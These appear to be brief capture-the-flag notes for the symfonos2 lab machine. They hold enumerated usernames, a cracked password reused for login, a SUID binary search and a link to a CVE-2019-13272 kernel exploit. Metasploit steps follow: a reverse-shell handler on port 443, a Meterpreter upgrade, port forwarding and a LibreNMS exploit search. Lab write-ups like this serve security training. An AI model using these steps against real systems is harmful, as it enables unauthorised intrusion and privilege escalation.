```
S-1-22-1-1000 Unix User\aeolus (Local User)                                                                                                    
S-1-22-1-1001 Unix User\cronus (Local User)

sergioteamo

Password reuse!

aeolus@symfonos2:~$ find / -type f -perm -04000 -ls 2>/dev/null
   922054     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   923944     44 -rwsr-xr--   1 root     messagebus    42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1053558    432 -rwsr-xr-x   1 root     root         440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
   796686    996 -rwsr-xr-x   1 root     root        1019656 May 28  2019 /usr/sbin/exim4
   805767    140 -rwsr-xr-x   1 root     root         140944 Jun  5  2017 /usr/bin/sudo
   786513     60 -rwsr-xr-x   1 root     root          59680 May 17  2017 /usr/bin/passwd
   786510     40 -rwsr-xr-x   1 root     root          40504 May 17  2017 /usr/bin/chsh
   786509     52 -rwsr-xr-x   1 root     root          50040 May 17  2017 /usr/bin/chfn
   789374     40 -rwsr-xr-x   1 root     root          40312 May 17  2017 /usr/bin/newgrp
   786512     76 -rwsr-xr-x   1 root     root          75792 May 17  2017 /usr/bin/gpasswd
  1048620     44 -rwsr-xr-x   1 root     root          44304 Mar  7  2018 /bin/mount
  1048618     40 -rwsr-xr-x   1 root     root          40536 May 17  2017 /bin/su
  1048643     60 -rwsr-xr-x   1 root     root          61240 Nov 10  2016 /bin/ping
  1048621     32 -rwsr-xr-x   1 root     root          31720 Mar  7  2018 /bin/umount

<https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c>

use exploit/multi/handler
set lhost eth0
set lport 443
run

ctrl + z
search shell_to
use 0
sessions
set session 5
run
sessions 6


portfwd add -l 1234 -p 8080 -r 127.0.0.1
search librenms
use 1
```

![unnamed_253f375ccae141cdabbc6fdae222aadc](unnamed_253f375ccae141cdabbc6fdae222aadc.png)
![unnamed_431aee398a4d4fc58c2597c62a7f3aa4](unnamed_431aee398a4d4fc58c2597c62a7f3aa4.png)
![unnamed_418765ff261544d6b22d67c9f2ae5a95](unnamed_418765ff261544d6b22d67c9f2ae5a95.png)
![unnamed_36a84193377f451796f57c4d17efd2d1](unnamed_36a84193377f451796f57c4d17efd2d1.png)
![unnamed_1be08f6ad2454d358dde67a89b7b5525](unnamed_1be08f6ad2454d358dde67a89b7b5525.png)
![unnamed_d95fa09dae5d4a81b2315de668b623af](unnamed_d95fa09dae5d4a81b2315de668b623af.png)
![unnamed_a70a09ee91e34135bdf4dd29f3d2c17b](unnamed_a70a09ee91e34135bdf4dd29f3d2c17b.png)
![unnamed_bbfb36e66e68488aa183f39b8f076e34](unnamed_bbfb36e66e68488aa183f39b8f076e34.png)

